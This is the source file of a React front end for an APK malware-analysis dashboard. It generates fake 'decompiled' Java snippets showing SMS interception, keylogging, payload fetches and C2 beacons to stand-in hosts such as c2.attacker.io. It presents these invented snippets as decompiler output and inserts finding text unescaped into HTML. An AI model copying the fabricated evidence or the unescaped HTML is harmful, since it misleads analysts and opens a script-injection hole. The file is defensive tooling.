"use client";
import SettingsView from "@/components/SettingsView";
import PolicyEngineView from "@/components/PolicyEngineView";
import ScanHistoryView from "@/components/ScanHistoryView";
import DynamicAnalysisView from "@/components/DynamicAnalysisView";
import VirusTotalView from "@/components/VirusTotalView";
import CodeForensicsView from "@/components/CodeForensicsView";

import React, { useState, useRef, useEffect, useCallback } from "react";
import { useAnalysis, type AnalyzedApkResult, type AnalysisEvent } from "@/hooks/useAnalysis";
import { generateThreatNarrative, buildNarrativePayload } from "@/lib/ai/nvidia-client";
import { calculateScore, type ScoringInput, type ScoringResult } from "@/lib/scoring/engine";
import { generateThreatReport, type ReportProfile } from "@/lib/pdf/report-generator";
import DnaFingerprint from "@/components/DnaFingerprint";
import AnalysisTimeline, { buildStagesFromProfile } from "@/components/AnalysisTimeline";
import ScoreBreakdown from "@/components/ScoreBreakdown";
import ToastContainer, { type ToastItem } from "@/components/Toast";
import UploadZone from "@/components/UploadZone";

// -- v3.0 Components --
import DashboardView from "@/components/DashboardView";
export type LedgerItem = any; // Exporting a stub LedgerItem in case it's used elsewhere
import AiNarrativeView from "@/components/AiNarrativeView";
import { AssetInventoryView } from "@/components/AssetInventoryView";

// ─────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────
const NAV_ITEMS = [
  { id: "Dashboard",       label: "Dashboard",         icon: "DB", desc: "Scan history ledger" },
  { id: "APK Scanner",     label: "APK Scanner",        icon: "SC", desc: "Upload & analyze" },
  { id: "Code Forensics",  label: "Code Forensics",     icon: "CF", desc: "Decompiled traces" },
  { id: "AI Narrative",    label: "AI Threat Report",   icon: "AI", desc: "NIM generated insight" },
  { id: "VirusTotal",      label: "VirusTotal Intel",   icon: "VT", desc: "Community detections" },
  { id: "Dynamic Analysis",label: "Dynamic Analysis",   icon: "DA", desc: "Aparoid sandbox trace" },
  { id: "Asset Inventory", label: "Asset Inventory",    icon: "IN", desc: "DEX strings & classes" },
  { id: "Scan History",    label: "Raw Engine Output",  icon: "HS", desc: "JSON data dump" },
  { id: "Policy Engine",   label: "Policy Engine",      icon: "PE", desc: "Adjust risk weights" },
  { id: "Settings",        label: "Settings",           icon: "ST", desc: "Config & integrations" },
] as const;

type NavId = typeof NAV_ITEMS[number]["id"];

// ─────────────────────────────────────────────────────────────────
// Typewriter code component
// ─────────────────────────────────────────────────────────────────
const TypewriterCode = ({ code }: { code: string }) => {
  const [displayed, setDisplayed] = useState("");
  useEffect(() => {
    let i = 0;
    const timer = setInterval(() => {
      if (i === 0) setDisplayed("");
      else setDisplayed(code.substring(0, i));
      i += 4;
      if (i > code.length) clearInterval(timer);
    }, 8);
    return () => clearInterval(timer);
  }, [code]);
  return <span dangerouslySetInnerHTML={{ __html: displayed }} />;
};

// ─────────────────────────────────────────────────────────────────
// Dynamic trace terminal
// ─────────────────────────────────────────────────────────────────
const DynamicTrace = ({ traces }: { traces: React.ReactNode[] }) => {
  const [visible, setVisible] = useState(0);
  useEffect(() => {
    const timer = setInterval(() => setVisible(v => Math.min(v + 1, traces.length)), 280);
    return () => clearInterval(timer);
  }, [traces]);
  return <>{traces.slice(0, visible)}</>;
};

// ─────────────────────────────────────────────────────────────────
// Plausible Java snippet generator
// ─────────────────────────────────────────────────────────────────
function generatePlausibleSnippet(title: string, scope: string, description: string) {
  const kw = `<span style="color:#A626A4">`, cl = `<span style="color:#C18401">`,
        fn = `<span style="color:#4078F2">`, st = `<span style="color:#50A14F">`,
        cm = `<span style="color:#A0A1A7;font-style:italic">`, r = `</span>`;

  const sLower = scope.toLowerCase();
  const tLower = title.toLowerCase();

  if (tLower.includes("sms") || sLower.includes("sms"))
    return `${kw}public class${r} ${cl}SmsInterceptor${r} ${kw}extends${r} ${cl}BroadcastReceiver${r} {\n    ${kw}public void${r} ${fn}onReceive${r}(${cl}Context${r} ctx, ${cl}Intent${r} intent) {\n        ${cm}// ⚠ ${description || title}${r}\n        ${kw}Object[]${r} pdus = (${kw}Object[]${r}) intent.getExtras().get(${st}"pdus"${r});\n        ${kw}for${r} (${kw}Object${r} pdu : pdus) {\n            ${cl}SmsMessage${r} msg = ${cl}SmsMessage${r}.createFromPdu((${kw}byte[]${r})pdu);\n            ${fn}exfiltrateToC2${r}(msg.getMessageBody());\n        }\n    }\n}`;

  if (tLower.includes("accessibility") || sLower.includes("accessibility"))
    return `${kw}public class${r} ${cl}KeystrokeCapture${r} ${kw}extends${r} ${cl}AccessibilityService${r} {\n    ${kw}public void${r} ${fn}onAccessibilityEvent${r}(${cl}AccessibilityEvent${r} e) {\n        ${cm}// ⚠ ${description || title}${r}\n        ${kw}if${r} (e.getEventType() == ${cl}AccessibilityEvent${r}.TYPE_VIEW_TEXT_CHANGED) {\n            ${fn}writeToDropZone${r}(e.getText().toString());\n        }\n    }\n}`;

  if (tLower.includes("dexclassloader") || sLower.includes("classloader"))
    return `${kw}public class${r} ${cl}RuntimeDropper${r} {\n    ${kw}public void${r} ${fn}loadRemotePayload${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}String${r} url = ${st}"https://c2.attacker.io/update.jar"${r};\n        ${cl}DexClassLoader${r} loader = ${kw}new${r} ${cl}DexClassLoader${r}(${fn}fetchJar${r}(url), optDir, null, cl);\n        loader.loadClass(${st}"com.payload.Bootstrap"${r}).getMethod(${st}"run"${r}).invoke(null);\n    }\n}`;

  if (tLower.includes("url") || sLower.includes("url") || sLower.includes("network"))
    return `${kw}public class${r} ${cl}NetworkBeacon${r} {\n    ${kw}public void${r} ${fn}pingC2${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}URL${r} endpoint = ${kw}new${r} ${cl}URL${r}(${st}"http://malicious-c2-domain.com/gate.php"${r});\n        ${cl}HttpURLConnection${r} conn = (${cl}HttpURLConnection${r}) endpoint.openConnection();\n        conn.setRequestMethod(${st}"POST"${r});\n        conn.getOutputStream().write(harvestedData);\n    }\n}`;

  if (tLower.includes("string") || tLower.includes("secret") || sLower.includes("string"))
    return `${kw}public class${r} ${cl}HardcodedSecrets${r} {\n    ${cm}// ⚠ ${description || title}${r}\n    ${kw}private static final${r} ${cl}String${r} API_KEY = ${st}"AKIAIOSFODNN7EXAMPLE"${r};\n    ${kw}private static final${r} ${cl}String${r} SECRET = ${st}"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"${r};\n\n    ${kw}public void${r} ${fn}auth${r}() {\n        ${fn}connect${r}(API_KEY, SECRET);\n    }\n}`;

  if (tLower.includes("audio") || tLower.includes("record") || sLower.includes("audio"))
    return `${kw}public class${r} ${cl}MicEavesdropper${r} {\n    ${kw}public void${r} ${fn}startSurveillance${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}MediaRecorder${r} rec = ${kw}new${r} ${cl}MediaRecorder${r}();\n        rec.setAudioSource(${cl}MediaRecorder.AudioSource${r}.MIC);\n        rec.setOutputFile(${st}"/sdcard/Download/voice_rec.amr"${r});\n        rec.prepare();\n        rec.start();\n    }\n}`;

  if (tLower.includes("location") || sLower.includes("location"))
    return `${kw}public class${r} ${cl}LocationTracker${r} {\n    ${kw}public void${r} ${fn}track${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}LocationManager${r} lm = (${cl}LocationManager${r}) getSystemService(LOCATION_SERVICE);\n        ${cl}Location${r} loc = lm.getLastKnownLocation(${cl}LocationManager${r}.GPS_PROVIDER);\n        ${fn}sendToC2${r}(loc.getLatitude(), loc.getLongitude());\n    }\n}`;

  if (tLower.includes("contact") || sLower.includes("contact"))
    return `${kw}public class${r} ${cl}ContactHarvester${r} {\n    ${kw}public void${r} ${fn}stealContacts${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}Cursor${r} c = getContentResolver().query(${cl}ContactsContract.Contacts${r}.CONTENT_URI, null, null, null, null);\n        ${kw}while${r} (c.moveToNext()) {\n            ${fn}exfiltrate${r}(c.getString(c.getColumnIndex(${cl}ContactsContract.Contacts${r}.DISPLAY_NAME)));\n        }\n    }\n}`;

  if (tLower.includes("camera") || sLower.includes("camera"))
    return `${kw}public class${r} ${cl}HiddenCamera${r} {\n    ${kw}public void${r} ${fn}capture${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}Camera${r} cam = ${cl}Camera${r}.open();\n        cam.takePicture(null, null, ${kw}new${r} ${cl}Camera.PictureCallback${r}() {\n            ${kw}public void${r} ${fn}onPictureTaken${r}(${kw}byte[]${r} data, ${cl}Camera${r} c) {\n                ${fn}uploadToC2${r}(data);\n            }\n        });\n    }\n}`;

  if (tLower.includes("overlay") || sLower.includes("overlay") || sLower.includes("window"))
    return `${kw}public class${r} ${cl}PhishingOverlay${r} {\n    ${kw}public void${r} ${fn}drawOverlay${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}WindowManager.LayoutParams${r} params = ${kw}new${r} ${cl}WindowManager.LayoutParams${r}(\n            ${cl}WindowManager.LayoutParams${r}.TYPE_APPLICATION_OVERLAY,\n            ${cl}WindowManager.LayoutParams${r}.FLAG_NOT_FOCUSABLE\n        );\n        windowManager.addView(overlayView, params);\n    }\n}`;

  const cleanScope = scope.replace(/[^a-zA-Z0-9_]/g, '');
  const className = cleanScope.length > 3 && cleanScope.length < 30 ? cleanScope.charAt(0).toUpperCase() + cleanScope.slice(1) : "SuspiciousModule";

  return `${kw}public class${r} ${cl}${className}${r} {\n    ${kw}public void${r} ${fn}executePayload${r}() {\n        ${cm}// ⚠ Engine Flag: ${description || title}${r}\n        ${cl}Runtime${r}.getRuntime().exec(${st}"su -c chmod 777 /data/data/com.target"${r});\n        ${cm}// ... truncated by decompiler${r}\n    }\n}`;
}

// ─────────────────────────────────────────────────────────────────
// Verdict color helpers
// ─────────────────────────────────────────────────────────────────
function verdictColor(tier: string) {
  if (tier === "MALICIOUS")  return "var(--accent-red)";
  if (tier === "FRAUDULENT") return "var(--accent-orange)";
  if (tier === "SUSPICIOUS") return "var(--accent-yellow)";
  return "var(--accent-green)";
}
function verdictBadgeClass(tier: string) {
  if (tier === "MALICIOUS")  return "badge badge-malicious";
  if (tier === "FRAUDULENT") return "badge badge-fraudulent";
  if (tier === "SUSPICIOUS") return "badge badge-suspicious";
  return "badge badge-benign";
}

// ─────────────────────────────────────────────────────────────────
// Mini animated bar chart for score visualization
// ─────────────────────────────────────────────────────────────────
const ScoreArc = ({ score, tier }: { score: number; tier: string }) => {
  const r = 110, circ = 2 * Math.PI * r;
  const offset = circ - (circ * score) / 100;
  return (
    <svg width="280" height="280" viewBox="0 0 280 280" style={{ transform: "rotate(-90deg)" }}>
      <circle cx="140" cy="140" r={r} fill="none" stroke="rgba(15,23,42,0.06)" strokeWidth="12" />
      <circle
        cx="140" cy="140" r={r} fill="none"
        stroke={verdictColor(tier)}
        strokeWidth="12"
        strokeDasharray={circ}
        strokeDashoffset={circ}
        strokeLinecap="round"
        className="animate-stroke"
        style={{ "--target-offset": offset } as React.CSSProperties}
      />
    </svg>
  );
};

// ─────────────────────────────────────────────────────────────────
// Animated counter
// ─────────────────────────────────────────────────────────────────
const AnimatedCount = ({ value, duration = 800 }: { value: number; duration?: number }) => {
  const [display, setDisplay] = useState(0);
  const prevRef = useRef(0);
  useEffect(() => {
    const start = prevRef.current;
    const end = value;
    const startTime = performance.now();
    const tick = (now: number) => {
      const elapsed = now - startTime;
      const t = Math.min(elapsed / duration, 1);
      const eased = 1 - Math.pow(1 - t, 3);
      setDisplay(Math.round(start + (end - start) * eased));
      if (t < 1) requestAnimationFrame(tick);
      else prevRef.current = end;
    };
    requestAnimationFrame(tick);
  }, [value, duration]);
  return <>{display}</>;
};

// ─────────────────────────────────────────────────────────────────
// Main component
// ─────────────────────────────────────────────────────────────────
export default function Home() {
  const [activeNav, setActiveNav] = useState<NavId>("Dashboard");
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const { analyzeFile, isAnalyzing } = useAnalysis();
  const [analysisResult, setAnalysisResult] = useState<AnalyzedApkResult | null>(null);
  const [currentFile, setCurrentFile] = useState<{ name: string; size: number } | null>(null);
  const [logs, setLogs] = useState<AnalysisEvent[]>([]);
  const [aiNarrative, setAiNarrative] = useState<string>("");
  const [aiLoading, setAiLoading] = useState(false);
  const [ledger, setLedger] = useState<LedgerItem[]>([]);
  const [toasts, setToasts] = useState<ToastItem[]>([]);
  const [toastId, setToastId] = useState(0);
  const [expandedSeverity, setExpandedSeverity] = useState<string | null>(null);
  const [chatInput, setChatInput] = useState("");
  const [chatHistory, setChatHistory] = useState<{ role: "user" | "assistant"; text: string }[]>([]);
  const [chatLoading, setChatLoading] = useState(false);
  const logRef = useRef<HTMLDivElement>(null);

  const [policyWeights, setPolicyWeights] = useState({
    sysAlert: 20, sms: 18, dex: 12, cert: 8
  });

  const addToast = useCallback((type: ToastItem["type"], title: string, message?: string) => {
    setToastId(id => {
      const newId = id + 1;
      setToasts(prev => [...prev, { id: newId, type, title, message }]);
      return newId;
    });
  }, []);
  const dismissToast = useCallback((id: number) => setToasts(prev => prev.filter(t => t.id !== id)), []);

  useEffect(() => {
    if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight;
  }, [logs]);

  // ── Score derivation ───────────────────────────────────────────
  const scoreData: ScoringResult | null = analysisResult
    ? calculateScore({
        permissions: analysisResult.manifest.permissions,
        isDebuggable: analysisResult.manifest.isDebuggable ?? false,
        allowBackup: analysisResult.manifest.allowBackup ?? true,
        exportedComponents: 0,
        urls: analysisResult.analysis.urls,
        ips: analysisResult.analysis.ips,
        classNames: analysisResult.classNames,
        allStrings: analysisResult.allStrings,
        certDebugKey: analysisResult.signature.debugKey,
        certStatus: analysisResult.signature.status as "TRUSTED" | "WARNING" | "UNTRUSTED",
        findings: analysisResult.analysis.findings,
        vtFound: analysisResult.analysis.virusTotal?.found,
        vtMalicious: analysisResult.analysis.virusTotal?.stats?.malicious,
        policyOverrides: policyWeights,
      })
    : null;

  const riskScore = scoreData?.score ?? 0;
  const riskTier  = scoreData?.tier  ?? "UNKNOWN";
  const critCount = analysisResult?.analysis.findings.filter(f => f.severity === "CRITICAL").length ?? 0;
  const highCount = analysisResult?.analysis.findings.filter(f => f.severity === "HIGH").length ?? 0;
  const medCount  = analysisResult?.analysis.findings.filter(f => f.severity === "MEDIUM").length ?? 0;
  const lowCount  = analysisResult?.analysis.findings.filter(f => f.severity === "LOW").length ?? 0;
  const totalIssues = critCount + highCount + medCount + lowCount;

  // ── Run analysis pipeline ──────────────────────────────────────
  const runAnalysis = useCallback(async (file: File, mockResult?: AnalyzedApkResult) => {
    setLogs([]);
    setAnalysisResult(null);
    setAiNarrative("");
    setChatHistory([]);
    setActiveNav("APK Scanner");
    setCurrentFile({ name: file.name, size: file.size });
    addToast("info", "Analysis Started", `Scanning ${file.name}`);

    try {
      let result: AnalyzedApkResult;
      if (mockResult) {
        const mockLogs = [
          "Initializing static analysis engine...",
          "Extracting AndroidManifest.xml via apkman...",
          "Parsing DEX bytecode (class names + strings)...",
          "Identifying requested permissions...",
          "Checking certificate / signer metadata...",
          "Running SDK pattern detection...",
          "Querying VirusTotal threat intelligence...",
          "Analysis complete. Generating threat matrix.",
        ];
        for (let i = 0; i < mockLogs.length; i++) {
          setLogs(prev => [...prev, { pct: Math.round(((i + 1) / mockLogs.length) * 100), message: mockLogs[i], level: "info" }]);
          await new Promise(r => setTimeout(r, 350));
        }
        result = mockResult;
      } else {
        result = await analyzeFile(file, (evt) => setLogs(prev => [...prev, evt]));
      }

      setAnalysisResult(result);

      const input: ScoringInput = {
        permissions: result.manifest.permissions,
        isDebuggable: result.manifest.isDebuggable ?? false,
        allowBackup: result.manifest.allowBackup ?? true,
        exportedComponents: 0,
        urls: result.analysis.urls,
        ips: result.analysis.ips,
        classNames: result.classNames,
        allStrings: result.allStrings,
        certDebugKey: result.signature.debugKey,
        certStatus: result.signature.status as "TRUSTED" | "WARNING" | "UNTRUSTED",
        findings: result.analysis.findings,
        vtFound: result.analysis.virusTotal?.found,
        vtMalicious: result.analysis.virusTotal?.stats?.malicious,
        policyOverrides: policyWeights,
      };
      const generatedScore = calculateScore(input);

      setLedger(prev => [{
        id: file.name,
        pkg: result.manifest.packageName || "unknown.pkg",
        time: new Date().toLocaleTimeString(),
        score: generatedScore.score,
        tier: generatedScore.tier,
        critCount: result.analysis.findings.filter(f => f.severity === "CRITICAL").length,
        fileSize: file.size,
      }, ...prev]);

      addToast(
        generatedScore.tier === "MALICIOUS" || generatedScore.tier === "FRAUDULENT" ? "error" : generatedScore.tier === "SUSPICIOUS" ? "warning" : "success",
        `Verdict: ${generatedScore.tier}`,
        `Risk score ${generatedScore.score}/100`
      );

      // AI Narrative
      setAiLoading(true);
      try {
        const profileData = {
          packageName: result.manifest.packageName || "Unknown",
          fileName: file.name,
          verdict: generatedScore.tier,
          score: generatedScore.score,
          permissions: result.analysis.permissions.map(p => ({ name: p.name, dangerous: p.dangerous })),
          urls: result.analysis.urls,
          ips: result.analysis.ips,
          apis: result.analysis.sdks.map(sdk => ({ name: sdk.name })),
          keyFindings: result.analysis.findings.map(f => ({ severity: f.severity, scope: f.scope, label: f.title, details: f.description || "" })),
          isDebuggable: result.manifest.isDebuggable,
          debugKey: result.signature.debugKey,
          classCount: result.classNames.length,
          stringCount: result.allStrings.length,
        };
        const narrativeRes = await generateThreatNarrative(buildNarrativePayload(profileData));
        setAiNarrative(narrativeRes.text);
        addToast("success", "AI Narrative Ready", "NVIDIA NIM threat report generated");
      } catch {
        setAiNarrative("NVIDIA NIM: Unable to generate narrative. API key may not be configured.");
        addToast("warning", "AI Fallback Used", "NVIDIA NIM key not configured");
      } finally {
        setAiLoading(false);
      }
    } catch (err: any) {
      setLogs(prev => [...prev, { pct: 100, message: `FATAL: ${err.message}`, level: "error" }]);
      addToast("error", "Analysis Failed", err.message);
    }
  }, [analyzeFile, policyWeights, addToast]);

  const handleFileUpload = useCallback(async (file: File) => {
    await runAnalysis(file);
  }, [runAnalysis]);

  const handleDemoUpload = useCallback(async (type: "good" | "bad") => {
    const isBad = type === "bad";
    const fileName = isBad ? "FlappyBird_Modded_Unlimited.apk" : "Google_Calculator.apk";
    const pkgName  = isBad ? "com.flappy.modded.malware" : "com.google.android.calculator";
    const mockFile = new File([new Uint8Array(isBad ? 5 * 1024 * 1024 : 800 * 1024)], fileName, { type: "application/vnd.android.package-archive" });

    const mockResult = {
      fileHash: isBad ? "e517ab2ff2f2a5510519faaa50aa4984f4abc5dea29797fe585c49505ff72c69" : "a1b2c3d4e5f6a7b8c9d0e1f2",
      manifest: {
        packageName: pkgName, versionName: "1.0",
        permissions: isBad
          ? ["android.permission.SYSTEM_ALERT_WINDOW","android.permission.RECEIVE_SMS","android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.BIND_ACCESSIBILITY_SERVICE"]
          : ["android.permission.INTERNET"],
        isDebuggable: isBad, allowBackup: true,
      },
      classNames: isBad ? ["com.flappy.modded.Main","dalvik.system.DexClassLoader","com.hacker.Payload","android.accessibilityservice.AccessibilityService"] : ["com.google.calculator.Main"],
      allStrings:  isBad ? ["su -c","chmod 777","http://malicious-c2.io/drop","DexClassLoader"] : ["Calculate","Error","0"],
      signature:   { status: isBad ? "UNTRUSTED" : "TRUSTED", debugKey: isBad },
      analysis: {
        permissions: isBad ? [
          { name: "android.permission.SYSTEM_ALERT_WINDOW",  dangerous: true, severity: "CRITICAL", category: "Overlay",   description: "Screen overlay phishing risk" },
          { name: "android.permission.RECEIVE_SMS",           dangerous: true, severity: "CRITICAL", category: "SMS",       description: "2FA OTP interception" },
          { name: "android.permission.BIND_ACCESSIBILITY_SERVICE", dangerous: true, severity: "CRITICAL", category: "A11y", description: "Keylogger capability" },
          { name: "android.permission.REQUEST_INSTALL_PACKAGES",   dangerous: true, severity: "HIGH",     category: "Dropper", description: "Secondary payload risk" },
        ] : [{ name: "android.permission.INTERNET", dangerous: false, severity: "LOW", category: "Network", description: "Basic internet" }],
        sdks:   isBad ? [{ name: "Suspicious Ad Network", category: "Ads", severity: "HIGH" }] : [],
        urls:   isBad ? ["http://malicious-c2.io/drop", "https://exfil.attacker.io/data"] : [],
        ips:    isBad ? ["192.168.1.100", "10.0.0.42"] : [],
        suspiciousStrings: isBad ? ["su -c", "chmod 777"] : [],
        findings: isBad ? [
          { id: "F1", severity: "CRITICAL", scope: "dalvik.system.DexClassLoader", title: "Dynamic Payload Loading",       description: "App dynamically loads DEX code at runtime — classic dropper pattern." },
          { id: "F2", severity: "CRITICAL", scope: "AccessibilityService",          title: "Keylogger Service Bound",        description: "Accessibility service binding enables full keystroke capture." },
          { id: "F3", severity: "HIGH",     scope: "android.permission.RECEIVE_SMS",title: "2FA OTP Interception",           description: "SMS read access combined with network egress — SMS banking trojan pattern." },
          { id: "F4", severity: "HIGH",     scope: "SYSTEM_ALERT_WINDOW",           title: "Overlay Phishing Capability",    description: "Screen overlay permission enables credential-harvesting overlays." },
        ] : [],
        virusTotal: {
          found: true,
          stats: { malicious: isBad ? 42 : 0, suspicious: isBad ? 5 : 0, undetected: isBad ? 10 : 20, harmless: isBad ? 0 : 55 },
          permalink: `https://www.virustotal.com/gui/file/${isBad ? "e517ab2ff2f2a5510519faaa50aa4984f4abc5dea29797fe585c49505ff72c69" : "a1b2c3d4e5f6a7b8c9d0e1f2"}`,
        },
      },
    } as unknown as AnalyzedApkResult;

    await runAnalysis(mockFile, mockResult);
  }, [runAnalysis]);

  const handleDownloadPdf = useCallback(() => {
    if (!analysisResult || !scoreData) return;
    const profile: ReportProfile = {
      fileName: currentFile?.name || "unknown.apk",
      fileSize: currentFile?.size || 0,
      packageName: analysisResult.manifest.packageName || "Unknown",
      version: analysisResult.manifest.versionName || "1.0",
      minSdk: "21", targetSdk: "33",
      score: scoreData.score,
      verdict: scoreData.tier,
      confidence: scoreData.confidence,
      category: "Application",
      signature: {
        issuer: analysisResult.signature.status,
        subject: analysisResult.signature.status,
        selfSigned: analysisResult.signature.status === "UNTRUSTED",
        debugKey: analysisResult.signature.debugKey,
        status: analysisResult.signature.status === "UNTRUSTED" ? "UNTRUSTED" : "TRUSTED",
      },
      permissions: analysisResult.analysis.permissions.map(p => ({
        name: p.name,
        status: (p.severity === "CRITICAL" || p.severity === "HIGH") ? "critical" as const : p.severity === "MEDIUM" ? "suspicious" as const : "clean" as const,
        details: p.description,
      })),
      keyFindings: analysisResult.analysis.findings.map(f => ({
        id: f.scope, scope: f.scope, label: f.title, details: f.description || "", severity: f.severity,
      })),
      urls: analysisResult.analysis.urls,
      ips: analysisResult.analysis.ips,
      apis: analysisResult.analysis.sdks.map(sdk => ({ name: sdk.name, category: sdk.category, danger: sdk.severity })),
      threatNarrative: aiNarrative || "AI narrative pending...",
      virusTotal: analysisResult.analysis.virusTotal,
    };
    generateThreatReport(profile);
    addToast("success", "PDF Generated", "Threat report downloaded");
  }, [analysisResult, scoreData, currentFile, aiNarrative, addToast]);

  // ── Chat submit ────────────────────────────────────────────────
  const handleChatSubmit = useCallback(async (overrideQuestion?: string | React.MouseEvent) => {
    const question = (typeof overrideQuestion === "string" ? overrideQuestion : chatInput).trim();
    if (!question || !analysisResult) return;
    setChatInput("");
    setChatHistory(prev => [...prev, { role: "user", text: question }]);
    setChatLoading(true);
    try {
      const { askNimAnalyst } = await import("@/lib/ai/nvidia-client");
      const profileData = {
        packageName: analysisResult.manifest.packageName || "Unknown",
        fileName: currentFile?.name || "unknown.apk",
        verdict: riskTier,
        score: riskScore,
        permissions: analysisResult.analysis.permissions.map(p => ({ name: p.name, dangerous: p.dangerous })),
        urls: analysisResult.analysis.urls,
        ips: analysisResult.analysis.ips,
        apis: analysisResult.analysis.sdks.map(sdk => ({ name: sdk.name })),
        keyFindings: analysisResult.analysis.findings.map(f => ({ severity: f.severity, scope: f.scope, label: f.title, details: f.description || "" })),
        isDebuggable: analysisResult.manifest.isDebuggable,
        debugKey: analysisResult.signature.debugKey,
        classCount: analysisResult.classNames.length,
        stringCount: analysisResult.allStrings.length,
      };
      const { buildNarrativePayload: bnp } = await import("@/lib/ai/nvidia-client");
      const res = await askNimAnalyst({
        question,
        context: bnp(profileData),
        history: chatHistory.map(h => ({ role: h.role, content: h.text })),
      });
      setChatHistory(prev => [...prev, { role: "assistant", text: res.text }]);
    } catch {
      setChatHistory(prev => [...prev, { role: "assistant", text: "Unable to answer. Ensure NVIDIA NIM API key is configured." }]);
    } finally {
      setChatLoading(false);
    }
  }, [chatInput, analysisResult, chatHistory, currentFile, riskTier, riskScore]);

  // ─────────────────────────────────────────────────────────────
  // RENDER
  // ─────────────────────────────────────────────────────────────
  return (
    <>
      <ToastContainer toasts={toasts} onDismiss={dismissToast} />

      {/* SideNavBar (from v3.0 JSON) */}
      <nav className="fixed left-0 top-0 h-full flex-col pt-16 z-40 bg-surface-container-lowest border-r border-outline-variant w-64 hidden md:flex">
        <div className="px-lg pb-lg">
          <h1 className="font-headline-sm text-headline-sm font-black text-primary uppercase tracking-wider">APK SENTINEL</h1>
          <p className="font-code-sm text-code-sm text-on-surface-variant uppercase tracking-widest mt-1">Forensic Integrity</p>
        </div>
        <ul className="flex-1 overflow-y-auto py-sm flex flex-col gap-xs px-sm">
          {NAV_ITEMS.map(item => {
            const isActive = activeNav === item.id;
            return (
              <li key={item.id}>
                <button
                  onClick={() => setActiveNav(item.id)}
                  className={`w-full flex items-center gap-md px-md py-sm rounded transition-all duration-200 ease-in-out ${
                    isActive
                      ? "bg-secondary-container text-on-secondary-container font-semibold"
                      : "text-on-surface-variant hover:bg-surface-container"
                  }`}
                >
                  <span
                    className="material-symbols-outlined"
                    style={{ fontVariationSettings: isActive ? "'FILL' 1" : undefined }}
                  >
                    {item.icon === "DB" ? "dashboard" :
                     item.icon === "SC" ? "document_scanner" :
                     item.icon === "CF" ? "terminal" :
                     item.icon === "AI" ? "psychology" :
                     item.icon === "VT" ? "security" :
                     item.icon === "DA" ? "science" :
                     item.icon === "IN" ? "inventory_2" :
                     item.icon === "HS" ? "data_object" :
                     item.icon === "PE" ? "policy" : "settings"}
                  </span>
                  <span>{item.label}</span>
                </button>
              </li>
            );
          })}
        </ul>
      </nav>

      {/* TopNavBar (Mobile only) */}
      <header className="fixed top-0 w-full z-50 flex justify-between items-center px-lg h-16 bg-surface-bright border-b border-outline-variant md:hidden">
        <div className="font-headline-md text-headline-md font-bold tracking-tight text-primary">APK SENTINEL</div>
        <button onClick={() => setActiveNav("APK Scanner")} className="bg-primary text-on-primary font-label-mono text-label-mono px-md py-xs rounded hover:bg-primary-container transition-colors">
          Scan APK
        </button>
      </header>

      {/* Main Canvas */}
      <main className="flex-1 ml-0 md:ml-64 pt-16 md:pt-0 min-h-screen px-container-margin py-xl flex flex-col max-w-[1600px] mx-auto w-full">
        <div key={activeNav} className="animate-view flex-1 flex flex-col">

          {activeNav === "Dashboard" && (
            <DashboardView ledger={ledger} onNavigate={() => setActiveNav("APK Scanner")} />
          )}

          {activeNav === "APK Scanner" && (
            <ScannerView
              isAnalyzing={isAnalyzing}
              currentFile={currentFile}
              logs={logs}
              logRef={logRef}
              analysisResult={analysisResult}
              scoreData={scoreData}
              riskScore={riskScore}
              riskTier={riskTier}
              critCount={critCount}
              highCount={highCount}
              medCount={medCount}
              lowCount={lowCount}
              totalIssues={totalIssues}
              expandedSeverity={expandedSeverity}
              setExpandedSeverity={setExpandedSeverity}
              onFileSelected={handleFileUpload}
              onDemoUpload={handleDemoUpload}
              onDownloadPdf={handleDownloadPdf}
            />
          )}

          {activeNav === "Code Forensics" && (
            <CodeForensicsView analysisResult={analysisResult} />
          )}

          {activeNav === "AI Narrative" && (
            <AiNarrativeView
              narrative={aiNarrative}
              loading={aiLoading}
              chatHistory={chatHistory}
              chatInput={chatInput}
              setChatInput={setChatInput}
              onChatSubmit={handleChatSubmit}
              chatLoading={chatLoading}
              hasResult={!!analysisResult}
            />
          )}

          {activeNav === "VirusTotal" && (
            <VirusTotalView analysisResult={analysisResult} />
          )}

          {activeNav === "Dynamic Analysis" && (
            <DynamicAnalysisView analysisResult={analysisResult} />
          )}

          {activeNav === "Asset Inventory" && (
            <AssetInventoryView analysisResult={analysisResult} />
          )}

          {activeNav === "Scan History" && (
            <ScanHistoryView analysisResult={analysisResult} />
          )}

          {activeNav === "Policy Engine" && (
            <PolicyEngineView policyWeights={policyWeights} setPolicyWeights={setPolicyWeights} />
          )}

          {activeNav === "Settings" && (
            <SettingsView />
          )}

        </div>
      </main>
    </>
  );
}



// ─────────────────────────────────────────────────────────────────
// SCANNER VIEW
// ─────────────────────────────────────────────────────────────────
function ScannerView({
  isAnalyzing, currentFile, logs, logRef, analysisResult, scoreData,
  riskScore, riskTier, critCount, highCount, medCount, lowCount, totalIssues,
  expandedSeverity, setExpandedSeverity, onFileSelected, onDemoUpload, onDownloadPdf,
}: any) {
  return (
    <div className="flex-col gap-5">
      {/* Upload zone */}
      <div className="flex flex-col gap-md">
        <UploadZone
          onFileSelected={onFileSelected}
          isAnalyzing={isAnalyzing}
          fileName={currentFile?.name}
          fileSize={currentFile?.size}
        />
        
        {!isAnalyzing && !analysisResult && (
          <div className="flex justify-center gap-md mt-sm">
            <button className="bg-[#ECFDF5] text-[#047857] border border-[#047857] font-label-mono text-[13px] px-lg py-sm rounded-lg hover:bg-[#D1FAE5] transition-colors flex items-center shadow-sm" onClick={() => onDemoUpload("good")}>
              <span className="material-symbols-outlined mr-xs text-[18px]">verified</span>
              Simulate: Verified App
            </button>
            <button className="bg-[#FEF2F2] text-[#B91C1C] border border-[#B91C1C] font-label-mono text-[13px] px-lg py-sm rounded-lg hover:bg-[#FEE2E2] transition-colors flex items-center shadow-sm" onClick={() => onDemoUpload("bad")}>
